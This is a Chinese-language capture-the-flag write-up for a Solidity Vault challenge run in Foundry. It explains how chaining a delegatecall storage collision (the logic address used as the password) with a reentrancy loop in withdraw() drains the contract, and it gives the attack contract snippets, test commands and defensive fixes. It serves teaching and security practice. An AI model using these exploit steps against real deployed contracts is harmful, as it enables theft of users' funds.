# Vault CTF 挑战 - 攻击流程文档

## 项目概述

本项目是一个智能合约安全 CTF 挑战,目标是从预先部署的 Vault 合约中提取所有资金(0.1 ether)。

## 快速开始

### 1. 项目位置

```bash
cd /Users/wangrenchang/Desktop/ETHChingMai/day20/day20P1/openspace_ctf
```

### 2. 运行测试

```bash
forge test -vvv
```

### 3. 预期结果

```
[PASS] testExploit() (gas: 661853)
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

## 漏洞原理

### 漏洞 #1: Delegatecall 存储碰撞

**原理**:
- Vault 合约的 fallback 函数使用 delegatecall 调用 VaultLogic
- VaultLogic 的存储变量 `password` (slot 1) 对应 Vault 的 `logic` 地址 (slot 1)
- 密码验证实际上是和 logic 地址比较

**利用**:
使用 logic 合约地址作为密码,成功调用 `changeOwner()` 篡改 owner。

### 漏洞 #2: 重入攻击

**原理**:
- `withdraw()` 函数先发送 ETH,后更新余额
- 违反了 CEI (Checks-Effects-Interactions) 模式
- 在余额清零前可重复调用

**利用**:
在 `receive()` 函数中重复调用 `withdraw()`,提取资金 11 次。

## 攻击步骤详解

### 步骤 1: 创建攻击合约

```solidity
Attacker attacker = new Attacker(vault);
```

创建攻击合约实例,传入 Vault 地址。

### 步骤 2: 执行攻击

```solidity
attacker.attack{value: 0.01 ether}(address(logic));
```

发送 0.01 ether 并调用攻击函数,传入 logic 合约地址。

### 步骤 3: 篡改 Owner

```solidity
// 在 Attacker.attack() 内部:
bytes32 correctPassword = bytes32(uint256(uint160(logicAddress)));
vault.call(abi.encodeWithSignature(
    "changeOwner(bytes32,address)", 
    correctPassword,
    address(this)
));
```

使用 logic 地址作为密码,通过 delegatecall 漏洞成为 owner。

### 步骤 4: 开启提款

```solidity
vault.openWithdraw();
```

以 owner 身份开启提款功能。

### 步骤 5: 存入资金

```solidity
vault.deposite{value: 0.01 ether}();
```

存入 0.01 ether 到 Vault。

### 步骤 6: 触发重入

```solidity
vault.withdraw();
```

首次调用 withdraw,在 receive() 中会触发重入。

### 步骤 7: 重入循环

```solidity
receive() external payable {
    attackCount++;
    if (address(vault).balance > 0 && attackCount < MAX_ATTACKS) {
        vault.withdraw();  // 重复调用
    }
}
```

重入 11 次,每次提取 0.01 ether。

### 步骤 8: 转移赃款

```solidity
payable(tx.origin).transfer(address(this).balance);
```

将所有资金(0.11 ether)转给玩家。

## 资金流向

```
初始状态:
├─ Vault: 0.1 ether (owner 存入)
└─ Player: 1 ether

攻击过程:
├─ Player → Attacker: 0.01 ether
├─ Attacker → Vault: 0.01 ether (存款)
└─ Vault → Attacker: 0.11 ether (重入 11 次 × 0.01)

最终状态:
├─ Vault: 0 ether ✓
├─ Attacker: 0 ether (已转出)
└─ Player: ~1.1 ether (原始 1 - 0.01 + 0.11)
```

## 如何验证成功

### 检查项:

1. ✅ **测试通过**: `forge test` 显示 PASS
2. ✅ **Vault 余额为 0**: `vault.isSolve()` 返回 true  
3. ✅ **玩家获得资金**: Player 余额增加约 0.1 ether
4. ✅ **重入次数正确**: attackCount = 11

### 验证命令:

```bash
# 运行测试
forge test -vvv

# 查看详细跟踪
forge test --trace testExploit

# 查看 gas 消耗
forge test --gas-report
```

## 项目文件结构

```
openspace_ctf/
├── src/
│   └── Vault.sol              # 包含漏洞的合约
├── test/
│   └── Vault.t.sol            # 测试和攻击合约
├── foundry.toml               # Foundry 配置
└── README.md                  # 项目说明
```

## 关键代码位置

- **Vault 合约**: [src/Vault.sol](file:///Users/wangrenchang/Desktop/ETHChingMai/day20/day20P1/openspace_ctf/src/Vault.sol)
- **攻击合约**: [test/Vault.t.sol](file:///Users/wangrenchang/Desktop/ETHChingMai/day20/day20P1/openspace_ctf/test/Vault.t.sol#L7-L55)
- **测试函数**: [test/Vault.t.sol](file:///Users/wangrenchang/Desktop/ETHChingMai/day20/day20P1/openspace_ctf/test/Vault.t.sol#L75-L85)

## 常见问题

### Q: 为什么需要 11 次重入?

**A**: 
- Vault 初始有 0.1 ether
- 攻击者存入 0.01 ether  
- 总共 0.11 ether
- 每次提取 0.01 ether
- 需要 11 次才能清空

### Q: 为什么用 logic 地址作为密码?

**A**: 
由于存储碰撞:
- VaultLogic slot 1 (password) → Vault slot 1 (logic)
- password == logic 地址时验证通过

### Q: 如果只重入 10 次会怎样?

**A**: 
- 提取: 0.01 × 10 = 0.1 ether
- Vault 剩余: 0.01 ether
- `vault.isSolve()` 返回 false
- 测试失败 ❌

## 安全建议

### 防御措施:

1. **避免 delegatecall 漏洞**:
   - 不在 fallback 中使用 delegatecall
   - 使用标准代理模式 (OpenZeppelin)
   - 严格验证调用者

2. **防止重入攻击**:
   - 遵循 CEI 模式
   - 使用 `ReentrancyGuard`
   - 在发送资金前更新状态

3. **修正逻辑错误**:
   - `>= 0` 改为 `> 0`
   - 使用 SafeMath (虽然 Solidity 0.8+ 已内置)

## 总结

通过组合两个漏洞:
1. **Delegatecall 存储碰撞** - 篡改 owner
2. **重入攻击** - 多次提取资金

成功从 Vault 中提取了全部 0.1 ether,完成挑战! 🎉

---

**相关文档**:
- [详细技术分析](file:///Users/wangrenchang/.gemini/antigravity/brain/a70b3ea1-688d-4bf4-bc3a-489bbe83cc03/walkthrough.md)
- [实施计划](file:///Users/wangrenchang/.gemini/antigravity/brain/a70b3ea1-688d-4bf4-bc3a-489bbe83cc03/implementation_plan.md)
